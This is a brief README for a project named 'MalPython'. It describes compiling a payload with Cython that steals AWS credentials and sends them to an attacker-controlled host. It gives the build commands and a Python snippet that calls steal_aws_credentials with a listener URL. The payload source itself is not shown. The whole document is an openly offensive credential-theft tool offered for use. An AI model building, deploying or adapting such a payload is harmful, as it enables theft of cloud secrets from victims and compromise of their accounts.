# MalPython

Building payload with cython.

Steal the AWS credentials and send it to remote host controlled by attacker.

## Build

```sh
pip3 install cython
python3 setup.py build_ext --inplace
```

## Load

payload can be loaded directly as long as it is stored in known path.

```python
import payload
payload.steal_aws_credentials("http://127.0.0.1:8080")
```